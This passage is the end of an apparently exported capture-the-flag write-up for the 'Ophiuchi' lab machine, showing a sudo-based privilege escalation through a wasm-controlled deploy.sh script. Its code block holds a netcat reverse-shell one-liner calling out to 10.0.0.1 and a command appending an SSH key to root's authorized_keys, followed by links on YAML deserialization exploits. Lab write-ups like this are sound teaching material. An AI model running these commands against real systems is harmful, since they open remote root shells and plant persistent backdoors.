src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2021.png"/></a></figure><figure id="b814e553-d56f-4c42-bdec-50f8c27b9eea" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2022.png"><img style="width:660px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2022.png"/></a></figure><figure id="589d3c81-8a35-4505-b277-e545b4ed0da6" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2023.png"><img style="width:891px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2023.png"/></a></figure><p id="2c26c512-eb52-4030-b9f9-a531ae87d56a" class="">Compile the program again, and up in the machine.</p><pre id="1ed1253a-d438-4092-9595-083f967934df" class="code"><code>wat2wasm main.wat</code></pre><figure id="981070bb-1543-45dd-a61d-3f57b85c23af" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2024.png"><img style="width:785px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2024.png"/></a></figure><p id="83dd5dde-1de6-4759-98bd-f51755397c3a" class="">In the same folder create a file called <a href="http://deploy.sh">deploy.sh</a>, paste your reverse shell or send a ssh-key and run sudoers command: </p><pre id="ca9c0b96-cd0a-42b3-945c-653b03811655" class="code"><code>sudo /usr/bin/go run /opt/wasm-functions/index.go
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
+#or
+echo &quot;YOUR SSH KEY&quot; &gt;&gt; /root/.ssh/authorized_keys</code></pre><figure id="eb3d8382-af7f-4114-8417-b0076ffe3f65" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2025.png"><img style="width:814px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2025.png"/></a></figure><p id="81c088c7-88e3-40c9-8b64-37bbd11a52ac" class="">Root access :</p><figure id="49f5d0dc-d7de-4917-a0a3-9232359d1513" class="image"><a href="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2026.png"><img style="width:1518px" src="Ophiuchi%20125c817455a04fd08e746417af45bd1b/Untitled%2026.png"/></a></figure><h3 id="817b1e37-940b-488e-abc1-06b030734a56" class="">Sources:</h3><p id="48b1521b-b70d-4dae-89c0-e7425394d128" class=""><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p id="b8cdc2e9-ca42-4298-984c-3071167ae465" class=""><a href="https://github.com/artsploit/yaml-payload/issues/3">https://github.com/artsploit/yaml-payload/issues/3</a></p><p id="1f0b50c7-171f-458a-9732-067b76e2815f" class=""><a href="https://github.com/artsploit/yaml-payload/issues/1">https://github.com/artsploit/yaml-payload/issues/1</a></p><p id="e2f23e3a-92ff-40cc-b4b0-2deea61e15e0" class=""><a href="https://web.archive.org/web/20190918220027/https://blog.semmle.com/swagger-yaml-parser-vulnerability/">https://web.archive.org/web/20190918220027/https://blog.semmle.com/swagger-yaml-parser-vulnerability/</a></p><p id="50c1455b-e7dc-4be3-b7e7-c0976d5fa3a8" class=""><a href="https://www.programmersought.com/article/15966770260/">https://www.programmersought.com/article/15966770260/</a></p><p id="f3943c9d-e110-4c69-8647-8810de54d824" class=""><a href="https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf">https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf</a></p><p id="44c3f352-c1ac-45f6-9495-19bc4283bab4" class=""><a href="https://www.rapid7.com/blog/post/2016/06/23/r7-2016-06-remote-code-execution-via-swagger-parameter-injection-cve-2016-5641/">https://www.rapid7.com/blog/post/2016/06/23/r7-2016-06-remote-code-execution-via-swagger-parameter-injection-cve-2016-5641/</a></p></div></article></body></html>
